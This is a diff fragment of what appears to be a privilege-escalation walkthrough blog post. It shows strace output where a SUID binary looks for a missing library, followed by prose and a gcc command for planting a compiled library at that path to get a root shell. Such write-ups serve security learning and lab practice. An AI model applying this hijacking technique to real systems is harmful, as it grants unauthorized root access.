@@ -412,8 +412,7 @@ access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
 open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
 access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
 open("/lib/libc.so.6", O_RDONLY)        = 3
-open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or
-directory){% endraw %}{% endcapture %} {% include code.html code=code %}
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory){% endraw %}{% endcapture %} {% include code.html code=code %}
 
 The missing library `/home/user/.config/libcalc.so` can be tried to exploit to spawn a `privilege shell`. Create the directory `mkdir /home/user/.config` and compile a library.
 {% capture code %}{% raw %}gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c{% endraw %}{% endcapture %} {% include code.html code=code %}
